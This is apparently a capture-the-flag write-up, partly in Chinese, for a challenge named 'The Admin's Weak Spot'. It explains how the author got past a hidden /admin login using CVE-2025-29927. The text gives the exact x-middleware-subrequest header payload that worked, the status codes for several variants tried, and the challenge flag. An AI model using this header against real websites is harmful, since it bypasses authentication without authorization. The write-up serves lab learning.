# The Admin’s Weak Spot

## 題目描述

The marketplace has an admin panel that's supposed to be secure. Can you find a way in?

## 解題思路

可以觀察有一個隱藏頁面叫做 `/admin`，進去以後會到 `/admin/login`，裡面不管輸入什麼都會說 `Invalid credentials`

查了一下發現有個 `CVE-2025-29927`，於是就試了一下他的 payload，加了 `x-middleware-subrequest`，最後發現 `x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware` 成功了

```text
[000] middleware:middleware:middleware:middleware:middleware
[200] src/middleware:src/middleware:src/middleware:src/middleware:src/middleware
[307] src/middleware
[307] pages/_middleware
```

## Flag

```text
bitflag{m1ddl3w4r3_byp455_1s_4_thr34t}
```
